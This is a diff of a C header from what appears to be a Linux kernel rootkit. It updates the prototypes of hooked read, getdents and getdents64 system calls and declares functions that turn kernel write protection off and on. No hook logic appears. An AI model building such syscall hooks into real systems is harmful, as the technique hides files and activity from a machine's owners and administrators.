@@ -13,7 +13,7 @@ typedef struct {
     void *orig;
 } sc_hook_t;
 
-extern asmlinkage ssize_t (*sys_read)(int, void *, size_t);
+extern asmlinkage ssize_t (*sys_read)(const struct pt_regs *);
 extern asmlinkage long (*sys_getdents)(const struct pt_regs *);
 extern asmlinkage long (*sys_getdents64)(const struct pt_regs *);
 
@@ -25,7 +25,7 @@ void disable_protection(void);
 void enable_protection(void);
 
 // hooks
-asmlinkage ssize_t g7_read(int, void *, size_t);
+asmlinkage ssize_t g7_read(const struct pt_regs *);
 asmlinkage long g7_getdents(const struct pt_regs *);
 asmlinkage long g7_getdents64(const struct pt_regs *);
 
